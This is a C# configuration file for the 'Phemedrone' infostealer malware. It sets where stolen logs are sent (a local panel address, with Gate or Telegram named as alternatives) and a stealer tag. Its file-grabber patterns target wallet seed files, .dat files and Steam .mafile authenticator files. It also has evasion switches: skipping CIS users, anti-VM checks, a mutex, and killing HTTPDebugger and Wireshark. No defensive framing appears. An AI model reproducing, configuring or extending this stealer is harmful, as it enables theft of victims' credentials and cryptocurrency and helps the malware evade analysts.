using System.Collections.Generic;
using Phemedrone.Senders;

namespace Phemedrone
{
    public class Config
    {
        // Here you need to specify a service you are using
        // for receiving logs (Gate or Telegram) with required values
        
        //i recommend using builder for building project

        public static ISender SenderService = new Panel("127.0.0.1:1337");
        
        // Stealer Tag
        public static string Tag = "Proliv";

        // used for builder, leave it blank
        public static string BuildID = "";
        
        // file grabber patterns (* - for any words)
        public static List<string> FilePatterns = new List<string>
        {
            "*.txt", "*seed*", "*.dat", "*.mafile",
        };
        
        public static int GrabberFileSize = 5; // grabber file size (MB)
        public static int GrabberDepth = 2;
        
        // Stealer Logic Settings
        public static bool AntiCIS = false; // If target is a CIS user then stealer STOPS its work
        
        public static bool AntiVm = false; // Anti Virtual Machine
        
        public static string MutexValue = "BestStealer"; // a value for mutex checking (leave blank for disabling this)
        
        public static bool AntiDebug = false; // Kill Process HTTPDebugger, WireShark (Open AntiDebugger.cs in Protections Folder to add new process)
    }
}